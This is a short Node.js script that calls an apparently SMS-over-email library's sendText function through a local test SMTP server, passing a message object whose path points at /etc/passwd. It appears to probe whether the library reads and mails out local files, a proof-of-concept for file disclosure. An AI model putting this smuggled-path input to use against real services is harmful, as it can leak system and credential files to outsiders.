const api = require('./index.js')({
    transport: {
        host: 'localhost',
        port: 1025,
        secure: false,
        ignoreTLS: true
    },
    mailOptions: { from: 'test@example.com' }
});

async function main() {
    try {
        const result = await api.sendText({
            number: '1234567890',
            carrier: 'tmobile',
            message: { path: '/etc/passwd' }
        });
        console.log("Result:", result);
    } catch(e) {
        console.error("Error:", e);
    }
}
main();
